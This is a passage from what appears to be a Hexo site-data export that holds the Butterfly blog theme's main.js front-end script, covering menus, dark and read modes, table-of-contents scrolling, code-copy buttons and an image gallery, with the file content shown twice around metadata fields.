themeChangeFn(mode), 300)\n      } else {\n        themeChangeFn(mode)\n      }\n    })\n  }\n\n  /**\n   * Rightside\n   */\n  const rightSideFn = {\n    readmode: () => { // read mode\n      const $body = document.body\n      const newEle = document.createElement('button')\n\n      const exitReadMode = () => {\n        $body.classList.remove('read-mode')\n        newEle.remove()\n        newEle.removeEventListener('click', exitReadMode)\n      }\n\n      $body.classList.add('read-mode')\n      newEle.type = 'button'\n      newEle.className = 'fas fa-sign-out-alt exit-readmode'\n      newEle.addEventListener('click', exitReadMode)\n      $body.appendChild(newEle)\n    },\n    darkmode: () => { // switch between light and dark mode\n      const willChangeMode = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark'\n      if (willChangeMode === 'dark') {\n        btf.activateDarkMode()\n        GLOBAL_CONFIG.Snackbar !== undefined && btf.snackbarShow(GLOBAL_CONFIG.Snackbar.day_to_night)\n      } else {\n        btf.activateLightMode()\n        GLOBAL_CONFIG.Snackbar !== undefined && btf.snackbarShow(GLOBAL_CONFIG.Snackbar.night_to_day)\n      }\n      btf.saveToLocal.set('theme', willChangeMode, 2)\n      handleThemeChange(willChangeMode)\n    },\n    'rightside-config': item => { // Show or hide rightside-hide-btn\n      const hideLayout = item.firstElementChild\n      if (hideLayout.classList.contains('show')) {\n        hideLayout.classList.add('status')\n        setTimeout(() => {\n          hideLayout.classList.remove('status')\n        }, 300)\n      }\n\n      hideLayout.classList.toggle('show')\n    },\n    'go-up': () => { // Back to top\n      btf.scrollToDest(0, 500)\n    },\n    'hide-aside-btn': () => { // Hide aside\n      const $htmlDom = document.documentElement.classList\n      const saveStatus = $htmlDom.contains('hide-aside') ? 'show' : 'hide'\n      btf.saveToLocal.set('aside-status', saveStatus, 2)\n      $htmlDom.toggle('hide-aside')\n    },\n    'mobile-toc-button': (p, item) => { // Show mobile toc\n      const tocEle = document.getElementById('card-toc')\n      tocEle.style.transition = 'transform 0.3s ease-in-out'\n\n      const tocEleHeight = tocEle.clientHeight\n      const btData = item.getBoundingClientRect()\n\n      const tocEleBottom = window.innerHeight - btData.bottom - 30\n      if (tocEleHeight > tocEleBottom) {\n        tocEle.style.transformOrigin = `right ${tocEleHeight - tocEleBottom - btData.height / 2}px`\n      }\n\n      tocEle.classList.toggle('open')\n      tocEle.addEventListener('transitionend', () => {\n        tocEle.style.cssText = ''\n      }, { once: true })\n    },\n    'chat-btn': () => { // Show chat\n      window.chatBtnFn()\n    },\n    translateLink: () => { // switch between traditional and simplified chinese\n      window.translateFn.translatePage()\n    }\n  }\n\n  document.getElementById('rightside').addEventListener('click', e => {\n    const $target = e.target.closest('[id]')\n    if ($target && rightSideFn[$target.id]) {\n      rightSideFn[$target.id](e.currentTarget, $target)\n    }\n  })\n\n  /**\n   * menu\n   * 側邊欄sub-menu 展開/收縮\n   */\n  const clickFnOfSubMenu = () => {\n    const handleClickOfSubMenu = e => {\n      const target = e.target.closest('.site-page.group')\n      if (!target) return\n      target.classList.toggle('hide')\n    }\n\n    const menusItems = document.querySelector('#sidebar-menus .menus_items')\n    menusItems && menusItems.addEventListener('click', handleClickOfSubMenu)\n  }\n\n  /**\n   * 手机端目录点击\n   */\n  const openMobileMenu = () => {\n    const toggleMenu = document.getElementById('toggle-menu')\n    if (!toggleMenu) return\n    btf.addEventListenerPjax(toggleMenu, 'click', () => { sidebarFn.open() })\n  }\n\n  /**\n * 複製時加上版權信息\n */\n  const addCopyright = () => {\n    const { limitCount, languages } = GLOBAL_CONFIG.copyright\n\n    const handleCopy = (e) => {\n      e.preventDefault()\n      const copyFont = window.getSelection(0).toString()\n      let textFont = copyFont\n      if (copyFont.length > limitCount) {\n        textFont = `${copyFont}\\n\\n\\n${languages.author}\\n${languages.link}${window.location.href}\\n${languages.source}\\n${languages.info}`\n      }\n      if (e.clipboardData) {\n        return e.clipboardData.setData('text', textFont)\n      } else {\n        return window.clipboardData.setData('text', textFont)\n      }\n    }\n\n    document.body.addEventListener('copy', handleCopy)\n  }\n\n  /**\n   * 網頁運行時間\n   */\n  const addRuntime = () => {\n    const $runtimeCount = document.getElementById('runtimeshow')\n    if ($runtimeCount) {\n      const publishDate = $runtimeCount.getAttribute('data-publishDate')\n      $runtimeCount.textContent = `${btf.diffDate(publishDate)} ${GLOBAL_CONFIG.runtime}`\n    }\n  }\n\n  /**\n   * 最後一次更新時間\n   */\n  const addLastPushDate = () => {\n    const $lastPushDateItem = document.getElementById('last-push-date')\n    if ($lastPushDateItem) {\n      const lastPushDate = $lastPushDateItem.getAttribute('data-lastPushDate')\n      $lastPushDateItem.textContent = btf.diffDate(lastPushDate, true)\n    }\n  }\n\n  /**\n   * table overflow\n   */\n  const addTableWrap = () => {\n    const $table = document.querySelectorAll('#article-container table')\n    if (!$table.length) return\n\n    $table.forEach(item => {\n      if (!item.closest('.highlight')) {\n        btf.wrap(item, 'div', { class: 'table-wrap' })\n      }\n    })\n  }\n\n  /**\n   * tag-hide\n   */\n  const clickFnOfTagHide = () => {\n    const hideButtons = document.querySelectorAll('#article-container .hide-button')\n    if (!hideButtons.length) return\n    hideButtons.forEach(item => item.addEventListener('click', e => {\n      const currentTarget = e.currentTarget\n      currentTarget.classList.add('open')\n      addJustifiedGallery(currentTarget.nextElementSibling.querySelectorAll('.gallery-container'))\n    }, { once: true }))\n  }\n\n  const tabsFn = () => {\n    const navTabsElements = document.querySelectorAll('#article-container .tabs')\n    if (!navTabsElements.length) return\n\n    const setActiveClass = (elements, activeIndex) => {\n      elements.forEach((el, index) => {\n        el.classList.toggle('active', index === activeIndex)\n      })\n    }\n\n    const handleNavClick = e => {\n      const target = e.target.closest('button')\n      if (!target || target.classList.contains('active')) return\n\n      const navItems = [...e.currentTarget.children]\n      const tabContents = [...e.currentTarget.nextElementSibling.children]\n      const indexOfButton = navItems.indexOf(target)\n      setActiveClass(navItems, indexOfButton)\n      e.currentTarget.classList.remove('no-default')\n      setActiveClass(tabContents, indexOfButton)\n      addJustifiedGallery(tabContents[indexOfButton].querySelectorAll('.gallery-container'), true)\n    }\n\n    const handleToTopClick = tabElement => e => {\n      if (e.target.closest('button')) {\n        btf.scrollToDest(btf.getEleTop(tabElement), 300)\n      }\n    }\n\n    navTabsElements.forEach(tabElement => {\n      btf.addEventListenerPjax(tabElement.firstElementChild, 'click', handleNavClick)\n      btf.addEventListenerPjax(tabElement.lastElementChild, 'click', handleToTopClick(tabElement))\n    })\n  }\n\n  const toggleCardCategory = () => {\n    const cardCategory = document.querySelector('#aside-cat-list.expandBtn')\n    if (!cardCategory) return\n\n    const handleToggleBtn = e => {\n      const target = e.target\n      if (target.nodeName === 'I') {\n        e.preventDefault()\n        target.parentNode.classList.toggle('expand')\n      }\n    }\n    btf.addEventListenerPjax(cardCategory, 'click', handleToggleBtn, true)\n  }\n\n  const addPostOutdateNotice = () => {\n    const ele = document.getElementById('post-outdate-notice')\n    if (!ele) return\n\n    const { limitDay, messagePrev, messageNext, postUpdate } = JSON.parse(ele.getAttribute('data'))\n    const diffDay = btf.diffDate(postUpdate)\n    if (diffDay >= limitDay) {\n      ele.textContent = `${messagePrev} ${diffDay} ${messageNext}`\n      ele.hidden = false\n    }\n  }\n\n  const lazyloadImg = () => {\n    window.lazyLoadInstance = new LazyLoad({\n      elements_selector: 'img',\n      threshold: 0,\n      data_src: 'lazy-src'\n    })\n\n    btf.addGlobalFn('pjaxComplete', () => {\n      window.lazyLoadInstance.update()\n    }, 'lazyload')\n  }\n\n  const relativeDate = selector => {\n    selector.forEach(item => {\n      item.textContent = btf.diffDate(item.getAttribute('datetime'), true)\n      item.style.display = 'inline'\n    })\n  }\n\n  const justifiedIndexPostUI = () => {\n    const recentPostsElement = document.getElementById('recent-posts')\n    if (!(recentPostsElement && recentPostsElement.classList.contains('masonry'))) return\n\n    const init = () => {\n      const masonryItem = new InfiniteGrid.MasonryInfiniteGrid('.recent-post-items', {\n        gap: { horizontal: 10, vertical: 20 },\n        useTransform: true,\n        useResizeObserver: true\n      })\n      masonryItem.renderItems()\n      btf.addGlobalFn('pjaxCompleteOnce', () => { masonryItem.destroy() }, 'removeJustifiedIndexPostUI')\n    }\n\n    typeof InfiniteGrid === 'function' ? init() : btf.getScript(`${GLOBAL_CONFIG.infinitegrid.js}`).then(init)\n  }\n\n  const unRefreshFn = () => {\n    window.addEventListener('resize', () => {\n      adjustMenu(false)\n      mobileSidebarOpen && btf.isHidden(document.getElementById('toggle-menu')) && sidebarFn.close()\n    })\n\n    const menuMask = document.getElementById('menu-mask')\n    menuMask && menuMask.addEventListener('click', () => { sidebarFn.close() })\n\n    clickFnOfSubMenu()\n    GLOBAL_CONFIG.islazyloadPlugin && lazyloadImg()\n    GLOBAL_CONFIG.copyright !== undefined && addCopyright()\n\n    if (GLOBAL_CONFIG.autoDarkmode) {\n      window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {\n        if (btf.saveToLocal.get('theme') !== undefined) return\n        e.matches ? handleThemeChange('dark') : handleThemeChange('light')\n      })\n    }\n  }\n\n  const forPostFn = () => {\n    addHighlightTool()\n    addPhotoFigcaption()\n    addJustifiedGallery(document.querySelectorAll('#article-container .gallery-container'))\n    runLightbox()\n    scrollFnToDo()\n    addTableWrap()\n    clickFnOfTagHide()\n    tabsFn()\n  }\n\n  const refreshFn = () => {\n    initAdjust()\n    justifiedIndexPostUI()\n\n    if (GLOBAL_CONFIG_SITE.pageType === 'post') {\n      addPostOutdateNotice()\n      GLOBAL_CONFIG.relativeDate.post && relativeDate(document.querySelectorAll('#post-meta time'))\n    } else {\n      GLOBAL_CONFIG.relativeDate.homepage && relativeDate(document.querySelectorAll('#recent-posts time'))\n      GLOBAL_CONFIG.runtime && addRuntime()\n      addLastPushDate()\n      toggleCardCategory()\n    }\n\n    GLOBAL_CONFIG_SITE.pageType === 'home' && scrollDownInIndex()\n    scrollFn()\n\n    forPostFn()\n    GLOBAL_CONFIG_SITE.pageType !== 'shuoshuo' && btf.switchComments(document)\n    openMobileMenu()\n  }\n\n  btf.addGlobalFn('pjaxComplete', refreshFn, 'refreshFn')\n  refreshFn()\n  unRefreshFn()\n\n  // 處理 hexo-blog-encrypt 事件\n  window.addEventListener('hexo-blog-decrypt', e => {\n    forPostFn()\n    window.translateFn.translateInitialization()\n    Object.values(window.globalFn.encrypt).forEach(fn => {\n      fn()\n    })\n  })\n})\n","date":"2025-10-07T06:26:10.322Z","updated":"2025-10-07T06:26:10.322Z","path":"js/main.js","layout":"false","title":"","comments":1,"_id":"cmglxf2i1000cuomy6mii0hl9","content":"document.addEventListener('DOMContentLoaded', () => {\n  let headerContentWidth, $nav\n  let mobileSidebarOpen = false\n\n  const adjustMenu = init => {\n    const getAllWidth = ele => Array.from(ele).reduce((width, i) => width + i.offsetWidth, 0)\n\n    if (init) {\n      const blogInfoWidth = getAllWidth(document.querySelector('#blog-info > a').children)\n      const menusWidth = getAllWidth(document.getElementById('menus').children)\n      headerContentWidth = blogInfoWidth + menusWidth\n      $nav = document.getElementById('nav')\n    }\n\n    const hideMenuIndex = window.innerWidth <= 768 || headerContentWidth > $nav.offsetWidth - 120\n    $nav.classList.toggle('hide-menu', hideMenuIndex)\n  }\n\n  // 初始化header\n  const initAdjust = () => {\n    adjustMenu(true)\n    $nav.classList.add('show')\n  }\n\n  // sidebar menus\n  const sidebarFn = {\n    open: () => {\n      btf.overflowPaddingR.add()\n      btf.animateIn(document.getElementById('menu-mask'), 'to_show 0.5s')\n      document.getElementById('sidebar-menus').classList.add('open')\n      mobileSidebarOpen = true\n    },\n    close: () => {\n      btf.overflowPaddingR.remove()\n      btf.animateOut(document.getElementById('menu-mask'), 'to_hide 0.5s')\n      document.getElementById('sidebar-menus').classList.remove('open')\n      mobileSidebarOpen = false\n    }\n  }\n\n  /**\n   * 首頁top_img底下的箭頭\n   */\n  const scrollDownInIndex = () => {\n    const handleScrollToDest = () => {\n      btf.scrollToDest(document.getElementById('content-inner').offsetTop, 300)\n    }\n\n    const $scrollDownEle = document.getElementById('scroll-down')\n    $scrollDownEle && btf.addEventListenerPjax($scrollDownEle, 'click', handleScrollToDest)\n  }\n\n  /**\n   * 代碼\n   * 只適用於Hexo默認的代碼渲染\n   */\n  const addHighlightTool = () => {\n    const highLight = GLOBAL_CONFIG.highlight\n    if (!highLight) return\n\n    const { highlightCopy, highlightLang, highlightHeightLimit, highlightFullpage, highlightMacStyle, plugin } = highLight\n    const isHighlightShrink = GLOBAL_CONFIG_SITE.isHighlightShrink\n    const isShowTool = highlightCopy || highlightLang || isHighlightShrink !== undefined || highlightFullpage || highlightMacStyle\n    const $figureHighlight = plugin === 'highlight.js' ? document.querySelectorAll('figure.highlight') : document.querySelectorAll('pre[class*=\"language-\"]')\n\n    if (!((isShowTool || highlightHeightLimit) && $figureHighlight.length)) return\n\n    const isPrismjs = plugin === 'prismjs'\n    const highlightShrinkClass = isHighlightShrink === true ? 'closed' : ''\n    const highlightShrinkEle = isHighlightShrink !== undefined ? '<i class=\"fas fa-angle-down expand\"></i>' : ''\n    const highlightCopyEle = highlightCopy ? '<div class=\"copy-notice\"></div><i class=\"fas fa-paste copy-button\"></i>' : ''\n    const highlightMacStyleEle = '<div class=\"macStyle\"><div class=\"mac-close\"></div><div class=\"mac-minimize\"></div><div class=\"mac-maximize\"></div></div>'\n    const highlightFullpageEle = highlightFullpage ? '<i class=\"fa-solid fa-up-right-and-down-left-from-center fullpage-button\"></i>' : ''\n\n    const alertInfo = (ele, text) => {\n      if (GLOBAL_CONFIG.Snackbar !== undefined) {\n        btf.snackbarShow(text)\n      } else {\n        ele.textContent = text\n        ele.style.opacity = 1\n        setTimeout(() => { ele.style.opacity = 0 }, 800)\n      }\n    }\n\n    const copy = async (text, ctx) => {\n      try {\n        await navigator.clipboard.writeText(text)\n        alertInfo(ctx, GLOBAL_CONFIG.copy.success)\n      } catch (err) {\n        console.error('Failed to copy: ', err)\n        alertInfo(ctx, GLOBAL_CONFIG.copy.noSupport)\n      }\n    }\n\n    // click events\n    const highlightCopyFn = (ele, clickEle) => {\n      const $buttonParent = ele.parentNode\n      $buttonParent.classList.add('copy-true')\n      const preCodeSelector = isPrismjs ? 'pre code' : 'table .code pre'\n      const codeElement = $buttonParent.querySelector(preCodeSelector)\n      if (!codeElement) return\n      copy(codeElement.innerText, clickEle.previousElementSibling)\n      $buttonParent.classList.remove('copy-true')\n    }\n\n    const highlightShrinkFn = ele => ele.classList.toggle('closed')\n\n    const codeFullpage = (item, clickEle) => {\n      const wrapEle = item.closest('figure.highlight')\n      const isFullpage = wrapEle.classList.toggle('code-fullpage')\n\n      document.body.style.overflow = isFullpage ? 'hidden' : ''\n      clickEle.classList.toggle('fa-down-left-and-up-right-to-center', isFullpage)\n      clickEle.classList.toggle('fa-up-right-and-down-left-from-center', !isFullpage)\n    }\n\n    const highlightToolsFn = e => {\n      const $target = e.target.classList\n      const currentElement = e.currentTarget\n      if ($target.contains('expand')) highlightShrinkFn(currentElement)\n      else if ($target.contains('copy-button')) highlightCopyFn(currentElement, e.target)\n      else if ($target.contains('fullpage-button')) codeFullpage(currentElement, e.target)\n    }\n\n    const expandCode = e => e.currentTarget.classList.toggle('expand-done')\n\n    // 獲取隱藏狀態下元素的真實高度\n    const getActualHeight = item => {\n      const hiddenElements = new Map()\n\n      const fix = () => {\n        let current = item\n        while (current !== document.body && current != null) {\n          if (window.getComputedStyle(current).display === 'none') {\n            hiddenElements.set(current, current.getAttribute('style') || '')\n          }\n          current = current.parentNode\n        }\n\n        const style = 'visibility: hidden !important; display: block !important;'\n        hiddenElements.forEach((originalStyle, elem) => {\n          elem.setAttribute('style', originalStyle ? originalStyle + ';' + style : style)\n        })\n      }\n\n      const restore = () => {\n        hiddenElements.forEach((originalStyle, elem) => {\n          if (originalStyle === '') elem.removeAttribute('style')\n          else elem.setAttribute('style', originalStyle)\n        })\n      }\n\n      fix()\n      const height = item.offsetHeight\n      restore()\n      return height\n    }\n\n    const createEle = (lang, item) => {\n      const fragment = document.createDocumentFragment()\n\n      if (isShowTool) {\n        const hlTools = document.createElement('div')\n        hlTools.className = `highlight-tools ${highlightShrinkClass}`\n        hlTools.innerHTML = highlightMacStyleEle + highlightShrinkEle + lang + highlightCopyEle + highlightFullpageEle\n        btf.addEventListenerPjax(hlTools, 'click', highlightToolsFn)\n        fragment.appendChild(hlTools)\n      }\n\n      if (highlightHeightLimit && getActualHeight(item) > highlightHeightLimit + 30) {\n        const ele = document.createElement('div')\n        ele.className = 'code-expand-btn'\n        ele.innerHTML = '<i class=\"fas fa-angle-double-down\"></i>'\n        btf.addEventListenerPjax(ele, 'click', expandCode)\n        fragment.appendChild(ele)\n      }\n\n      isPrismjs ? item.parentNode.insertBefore(fragment, item) : item.insertBefore(fragment, item.firstChild)\n    }\n\n    $figureHighlight.forEach(item => {\n      let langName = ''\n      if (isPrismjs) btf.wrap(item, 'figure', { class: 'highlight' })\n\n      if (!highlightLang) {\n        createEle('', item)\n        return\n      }\n\n      if (isPrismjs) {\n        langName = item.getAttribute('data-language') || 'Code'\n      } else {\n        langName = item.getAttribute('class').split(' ')[1]\n        if (langName === 'plain' || langName === undefined) langName = 'Code'\n      }\n      createEle(`<div class=\"code-lang\">${langName}</div>`, item)\n    })\n  }\n\n  /**\n   * PhotoFigcaption\n   */\n  const addPhotoFigcaption = () => {\n    if (!GLOBAL_CONFIG.isPhotoFigcaption) return\n    document.querySelectorAll('#article-container img').forEach(item => {\n      const altValue = item.title || item.alt\n      if (!altValue) return\n      const ele = document.createElement('div')\n      ele.className = 'img-alt text-center'\n      ele.textContent = altValue\n      item.insertAdjacentElement('afterend', ele)\n    })\n  }\n\n  /**\n   * Lightbox\n   */\n  const runLightbox = () => {\n    btf.loadLightbox(document.querySelectorAll('#article-container img:not(.no-lightbox)'))\n  }\n\n  /**\n   * justified-gallery 圖庫排版\n   */\n\n  const fetchUrl = async url => {\n    try {\n      const response = await fetch(url)\n      return await response.json()\n    } catch (error) {\n      console.error('Failed to fetch URL:', error)\n      return []\n    }\n  }\n\n  const runJustifiedGallery = (container, data, config) => {\n    const { isButton, limit, firstLimit, tabs } = config\n\n    const dataLength = data.length\n    const maxGroupKey = Math.ceil((dataLength - firstLimit) / limit + 1)\n\n    // Gallery configuration\n    const igConfig = {\n      gap: 5,\n      isConstantSize: true,\n      sizeRange: [150, 600],\n      // useResizeObserver: true,\n      // observeChildren: true,\n      useTransform: true\n      // useRecycle: false\n    }\n\n    const ig = new InfiniteGrid.JustifiedInfiniteGrid(container, igConfig)\n    let isLayoutHidden = false\n\n    // Utility functions\n    const sanitizeString = str => (str && str.replace(/\"/g, '&quot;')) || ''\n\n    const createImageItem = item => {\n      const alt = item.alt ? `alt=\"${sanitizeString(item.alt)}\"` : ''\n      const title = item.title ? `title=\"${sanitizeString(item.title)}\"` : ''\n      return `<div class=\"item\">\n        <img src=\"${item.url}\" data-grid-maintained-target=\"true\" ${alt} ${title} />\n      </div>`\n    }\n\n    const getItems = (nextGroupKey, count, isFirst = false) => {\n      const startIndex = isFirst ? (nextGroupKey - 1) * count : (nextGroupKey - 2) * count + firstLimit\n      return data.slice(startIndex, startIndex + count).map(createImageItem)\n    }\n\n    // Load more button\n    const addLoadMoreButton = container => {\n      const button = document.createElement('button')\n      button.innerHTML = `${GLOBAL_CONFIG.infinitegrid.buttonText}<i class=\"fa-solid fa-arrow-down\"></i>`\n\n      button.addEventListener('click', () => {\n        button.remove()\n        btf.setLoading.add(container)\n        appendItems(ig.getGroups().length + 1, limit)\n      }, { once: true })\n\n      container.insertAdjacentElement('afterend', button)\n    }\n\n    const appendItems = (nextGroupKey, count, isFirst) => {\n      ig.append(getItems(nextGroupKey, count, isFirst), nextGroupKey)\n    }\n\n    // Event handlers\n    const handleRenderComplete = e => {\n      if (tabs) {\n        const parentNode = container.parentNode\n        if (isLayoutHidden) {\n          parentNode.style.visibility = 'visible'\n        }\n        if (container.offsetHeight === 0) {\n          parentNode.style.visibility = 'hidden'\n          isLayoutHidden = true\n        }\n      }\n\n      const { updated, isResize, mounted } = e\n      if (!updated.length || !mounted.length || isResize) return\n\n      btf.loadLightbox(container.querySelectorAll('img:not(.medium-zoom-image)'))\n\n      if (ig.getGroups().length === maxGroupKey) {\n        btf.setLoading.remove(container)\n        !tabs && ig.off('renderComplete', handleRenderComplete)\n        return\n      }\n\n      if (isButton) {\n        btf.setLoading.remove(container)\n        addLoadMoreButton(container)\n      }\n    }\n\n    const handleRequestAppend = btf.debounce(e => {\n      const nextGroupKey = (+e.groupKey || 0) + 1\n\n      if (nextGroupKey === 1) appendItems(nextGroupKey, firstLimit, true)\n      else appendItems(nextGroupKey, limit)\n\n      if (nextGroupKey === maxGroupKey) ig.off('requestAppend', handleRequestAppend)\n    }, 300)\n\n    btf.setLoading.add(container)\n    ig.on('renderComplete', handleRenderComplete)\n\n    if (isButton) {\n      appendItems(1, firstLimit, true)\n    } else {\n      ig.on('requestAppend', handleRequestAppend)\n      ig.renderItems()\n    }\n\n    btf.addGlobalFn('pjaxSendOnce', () => ig.destroy())\n  }\n\n  const addJustifiedGallery = async (elements, tabs = false) => {\n    if (!elements.length) return\n\n    const initGallery = async () => {\n      for (const element of elements) {\n        if (btf.isHidden(element) || element.classList.contains('loaded')) continue\n\n        const config = {\n          isButton: element.getAttribute('data-button') === 'true',\n          limit: parseInt(element.getAttribute('data-limit'), 10),\n          firstLimit: parseInt(element.getAttribute('data-first'), 10),\n          tabs\n        }\n\n        const container = element.firstElementChild\n        const content = container.textContent\n        container.textContent = ''\n        element.classList.add('loaded')\n\n        try {\n          const data = element.getAttribute('data-type') === 'url' ? await fetchUrl(content) : JSON.parse(content)\n          runJustifiedGallery(container, data, config)\n        } catch (error) {\n          console.error('Gallery data parsing failed:', error)\n        }\n      }\n    }\n\n    if (typeof InfiniteGrid === 'function') {\n      await initGallery()\n    } else {\n      await btf.getScript(GLOBAL_CONFIG.infinitegrid.js)\n      await initGallery()\n    }\n  }\n\n  /**\n   * rightside scroll percent\n   */\n  const rightsideScrollPercent = currentTop => {\n    const scrollPercent = btf.getScrollPercent(currentTop, document.body)\n    const goUpElement = document.getElementById('go-up')\n\n    if (scrollPercent < 95) {\n      goUpElement.classList.add('show-percent')\n      goUpElement.querySelector('.scroll-percent').textContent = scrollPercent\n    } else {\n      goUpElement.classList.remove('show-percent')\n    }\n  }\n\n  /**\n   * 滾動處理\n   */\n  const scrollFn = () => {\n    const $rightside = document.getElementById('rightside')\n    const innerHeight = window.innerHeight + 56\n    let initTop = 0\n    const $header = document.getElementById('page-header')\n    const isChatBtn = typeof chatBtn !== 'undefined'\n    const isShowPercent = GLOBAL_CONFIG.percent.rightside\n\n    // 檢查文檔高度是否小於視窗高度\n    const checkDocumentHeight = () => {\n      if (document.body.scrollHeight <= innerHeight) {\n        $rightside.classList.add('rightside-show')\n        return true\n      }\n      return false\n    }\n\n    // 如果文檔高度小於視窗高度,直接返回\n    if (checkDocumentHeight()) return\n\n    // find the scroll direction\n    const scrollDirection = currentTop => {\n      const result = currentTop > initTop // true is down & false is up\n      initTop = currentTop\n      return result\n    }\n\n    let flag = ''\n    const scrollTask = btf.throttle(() => {\n      const currentTop = window.scrollY || document.documentElement.scrollTop\n      const isDown = scrollDirection(currentTop)\n      if (currentTop > 56) {\n        if (flag === '') {\n          $header.classList.add('nav-fixed')\n          $rightside.classList.add('rightside-show')\n        }\n\n        if (isDown) {\n          if (flag !== 'down') {\n            $header.classList.remove('nav-visible')\n            isChatBtn && window.chatBtn.hide()\n            flag = 'down'\n          }\n        } else {\n          if (flag !== 'up') {\n            $header.classList.add('nav-visible')\n            isChatBtn && window.chatBtn.show()\n            flag = 'up'\n          }\n        }\n      } else {\n        flag = ''\n        if (currentTop === 0) {\n          $header.classList.remove('nav-fixed', 'nav-visible')\n        }\n        $rightside.classList.remove('rightside-show')\n      }\n\n      isShowPercent && rightsideScrollPercent(currentTop)\n      checkDocumentHeight()\n    }, 300)\n\n    btf.addEventListenerPjax(window, 'scroll', scrollTask, { passive: true })\n  }\n\n  /**\n  * toc,anchor\n  */\n  const scrollFnToDo = () => {\n    const isToc = GLOBAL_CONFIG_SITE.isToc\n    const isAnchor = GLOBAL_CONFIG.isAnchor\n    const $article = document.getElementById('article-container')\n\n    if (!($article && (isToc || isAnchor))) return\n\n    let $tocLink, $cardToc, autoScrollToc, $tocPercentage, isExpand\n\n    if (isToc) {\n      const $cardTocLayout = document.getElementById('card-toc')\n      $cardToc = $cardTocLayout.querySelector('.toc-content')\n      $tocLink = $cardToc.querySelectorAll('.toc-link')\n      $tocPercentage = $cardTocLayout.querySelector('.toc-percentage')\n      isExpand = $cardToc.classList.contains('is-expand')\n\n      // toc元素點擊\n      const tocItemClickFn = e => {\n        const target = e.target.closest('.toc-link')\n        if (!target) return\n\n        e.preventDefault()\n        btf.scrollToDest(btf.getEleTop(document.getElementById(decodeURI(target.getAttribute('href')).replace('#', ''))), 300)\n        if (window.innerWidth < 900) {\n          $cardTocLayout.classList.remove('open')\n        }\n      }\n\n      btf.addEventListenerPjax($cardToc, 'click', tocItemClickFn)\n\n      autoScrollToc = item => {\n        const sidebarHeight = $cardToc.clientHeight\n        const itemOffsetTop = item.offsetTop\n        const itemHeight = item.clientHeight\n        const scrollTop = $cardToc.scrollTop\n        const offset = itemOffsetTop - scrollTop\n        const middlePosition = (sidebarHeight - itemHeight) / 2\n\n        if (offset !== middlePosition) {\n          $cardToc.scrollTop = scrollTop + (offset - middlePosition)\n        }\n      }\n\n      // 處理 hexo-blog-encrypt 事件\n      $cardToc.style.display = 'block'\n    }\n\n    // find head position & add active class\n    const $articleList = $article.querySelectorAll('h1,h2,h3,h4,h5,h6')\n    let detectItem = ''\n\n    const findHeadPosition = top => {\n      if (top === 0) return false\n\n      let currentId = ''\n      let currentIndex = ''\n\n      for (let i = 0; i < $articleList.length; i++) {\n        const ele = $articleList[i]\n        if (top > btf.getEleTop(ele) - 80) {\n          const id = ele.id\n          currentId = id ? '#' + encodeURI(id) : ''\n          currentIndex = i\n        } else {\n          break\n        }\n      }\n\n      if (detectItem === currentIndex) return\n\n      if (isAnchor) btf.updateAnchor(currentId)\n\n      detectItem = currentIndex\n\n      if (isToc) {\n        $cardToc.querySelectorAll('.active').forEach(i => i.classList.remove('active'))\n\n        if (currentId) {\n          const currentActive = $tocLink[currentIndex]\n          currentActive.classList.add('active')\n\n          setTimeout(() => autoScrollToc(currentActive), 0)\n\n          if (!isExpand) {\n            let parent = currentActive.parentNode\n            while (!parent.matches('.toc')) {\n              if (parent.matches('li')) parent.classList.add('active')\n              parent = parent.parentNode\n            }\n          }\n        }\n      }\n    }\n\n    // main of scroll\n    const tocScrollFn = btf.throttle(() => {\n      const currentTop = window.scrollY || document.documentElement.scrollTop\n      if (isToc && GLOBAL_CONFIG.percent.toc) {\n        $tocPercentage.textContent = btf.getScrollPercent(currentTop, $article)\n      }\n      findHeadPosition(currentTop)\n    }, 100)\n\n    btf.addEventListenerPjax(window, 'scroll', tocScrollFn, { passive: true })\n  }\n\n  const handleThemeChange = mode => {\n    const globalFn = window.globalFn || {}\n    const themeChange = globalFn.themeChange || {}\n    if (!themeChange) {\n      return\n    }\n\n    Object.keys(themeChange).forEach(key => {\n      const themeChangeFn = themeChange[key]\n      if (['disqus', 'disqusjs'].includes(key)) {\n        setTimeout(() => themeChangeFn(mode), 300)\n      } else {\n        themeChangeFn(mode)\n      }\n    })\n  }\n\n  /**\n   * Rightside\n   */\n  const rightSideFn = {\n    readmode: () => { // read mode\n      const $body = document.body\n      const newEle = document.createElement('button')\n\n      const exitReadMode = () => {\n        $body.classList.remove('read-mode')\n        newEle.remove()\n        newEle.removeEventListener('click', exitReadMode)\n      }\n\n      $body.classList.add('read-mode')\n      newEle.type = 'button'\n      newEle.className = 'fas fa-sign-out-alt exit-readmode'\n      newEle.addEventListener('click', exitReadMode)\n      $body.appendChild(newEle)\n    },\n    darkmode: () => { // switch between light and dark mode\n      const willChangeMode = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark'\n      if (willChangeMode === 'dark') {\n        btf.activateDarkMode()\n        GLOBAL_CONFIG.Snackbar !== undefined && btf.snackbarShow(GLOBAL_CONFIG.Snackbar.day_to_night)\n      } else {\n        btf.activateLightMode()\n        GLOBAL_CONFIG.Snackbar !== undefined && btf.snackbarShow(GLOBAL_CONFIG.Snackbar.night_to_day)\n      }\n      btf.saveToLocal.set('theme', willChangeMode, 2)\n      handleThemeChange(willChangeMode)\n    },\n    'rightside-config': item => { // Show or hide rightside-hide-btn\n      const hideLayout = item.firstElementChild\n      if (hideLayout.classList.contains('show')) {\n        hideLayout.classList.add('status')\n        setTimeout(() => {\n          hideLayout.classList.remove('status')\n        }, 300)\n      }\n\n      hideLayout.classList.toggle('show')\n    },\n    'go-up': () => { // Back to top\n      btf.scrollToDest(0, 500)\n    },\n    'hide-aside-btn': () => { // Hide aside\n      const $htmlDom = document.documentElement.classList\n      const saveStatus = $htmlDom.contains('hide-aside') ? 'show' : 'hide'\n      btf.saveToLocal.set('aside-status', saveStatus, 2)\n      $htmlDom.toggle('hide-aside')\n    },\n    'mobile-toc-button': (p, item) => { // Show mobile toc\n      const tocEle = document.getElementById('card-toc')\n      tocEle.style.transition = 'transform 0.3s ease-in-out'\n\n      const tocEleHeight = tocEle.clientHeight\n      const btData = item.getBoundingClientRect()\n\n      const tocEleBottom = window.innerHeight - btData.bottom - 30\n      if (tocEleHeight > tocEleBottom) {\n        tocEle.style.transformOrigin = `right ${tocEleHeight - tocEleBottom - btData.height / 2}px`\n      }\n\n      tocEle.classList.toggle('open')\n      tocEle.addEventListener('transitionend', () => {\n        tocEle.style.cssText = ''\n      }, { once: true })\n    },\n    